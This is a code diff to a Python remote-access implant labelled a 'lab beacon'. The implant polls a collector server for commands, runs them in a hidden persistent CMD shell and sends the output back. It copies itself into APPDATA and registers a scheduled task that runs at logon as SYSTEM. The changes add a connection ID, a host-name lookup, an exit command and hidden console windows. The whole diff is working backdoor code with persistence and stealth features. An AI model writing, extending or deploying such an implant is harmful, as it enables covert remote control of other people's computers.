@@ -24,8 +24,9 @@ ENABLE_LAB_BEACON = os.getenv("ENABLE_LAB_BEACON", "1") == "1"
 LAB_COLLECTOR_URL = os.getenv(
     "LAB_COLLECTOR_URL", "http://192.168.71.69:5050/checkin"
 )
-LAB_NODE_NAME = "TYPESHI-01"
+LAB_NODE_NAME = os.getenv("LAB_NODE_NAME", os.getenv("COMPUTERNAME", "unknown"))
 LAB_BEACON_INTERVAL = max(1, int(os.getenv("LAB_BEACON_INTERVAL", "1")))
+kill_on_next = False
 
 import subprocess
 import threading
@@ -41,6 +42,7 @@ from datetime import datetime, timezone
 # Tillatte kommandoer fra collector
 SHELL_TIMEOUT = 15
 MAX_OUTPUT = 4096
+CONN_ID = uuid.uuid4().hex[:8]
 
 
 def sendToShellSubprocess(proc, command, init_message):
@@ -120,11 +122,14 @@ def executeLabAction(action, pipe, init_message):
 
 
 def labActionLoop(init_message):
+    global kill_on_next
     pending_result = None
     shell_proc = None
 
     try:
         while True:
+            
+            
             # Start eller gjenopprett CMD
             if shell_proc is None or shell_proc.poll() is not None:
                 try:
@@ -156,6 +161,7 @@ def labActionLoop(init_message):
                     timezone.utc
                 ).isoformat(),  
                 "last_result": base64.b64encode(json.dumps(pending_result).encode("utf-8")).decode("utf-8") if pending_result else None,
+                "connection_id": CONN_ID,
             }
 
             request = urllib.request.Request(
@@ -185,6 +191,11 @@ def labActionLoop(init_message):
             ) as exc:
                 time.sleep(LAB_BEACON_INTERVAL)
                 continue
+            
+            if kill_on_next:
+                if shell_proc:
+                    shell_proc.kill()
+                break
 
             # HTTP-respons mottatt
             pending_result = None
@@ -192,9 +203,16 @@ def labActionLoop(init_message):
             action = response.get("action", "NOOP")
 
             if not isinstance(action, str):
-                action = "NOOP"
-
-            if action != "NOOP":
+                action = "NOOP" 
+            
+            if action.lower() == "exit":
+                kill_on_next = True
+                pending_result = {
+                    "command_id": response.get("command_id"),
+                    "action": action,
+                    "output": "dead_typeshi",
+                }
+            elif action != "NOOP":
                 output = executeLabAction(action, shell_proc, init_message)
                 
                 pending_result = {
@@ -203,10 +221,7 @@ def labActionLoop(init_message):
                     "output": output,
                 }
                 
-            if action.lower() == "exit_typeshi":
-                shell_proc.kill()
-                break
-
+           
             
 
             time.sleep(LAB_BEACON_INTERVAL)
@@ -229,7 +244,7 @@ def labActionLoop(init_message):
 def copySelfToKnowPath():
     import os
     import sys
-    known_path = os.path.join(os.getenv("APPDATA"), "bg_statusChecker.exe")
+    known_path = os.path.join(os.getenv("APPDATA"), "bg_agent.exe")
     if not os.path.exists(known_path):
         import shutil
         shutil.copy2(sys.executable, known_path)
@@ -270,7 +285,8 @@ def copySelfToKnowPath():
 def checkScheduledTaskExists(task_name = "bg_agent_task"):
     import subprocess
     try:
-        result = subprocess.run(["schtasks", "/Query", "/TN", task_name], capture_output=True, text=True)
+        #no console
+        result = subprocess.run(["schtasks", "/Query", "/TN", task_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW, text=True)
         if result.returncode == 0:
             return True
     except Exception as e:
@@ -285,10 +301,11 @@ def createScheduledTask(task_name = "bg_agent_task"):
         if checkScheduledTaskExists(task_name):
             return "Scheduled task already exists"
 
+        #no console for task creation as well
         subprocess.run([
             "schtasks", "/Create", "/F", "/SC", "ONLOGON", "/RU", "SYSTEM", "/RL", "HIGHEST",
             "/TN", task_name, "/TR", executable_path
-        ], check=True)
+        ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW, text=True)
 
         return "Scheduled task created successfully"
 
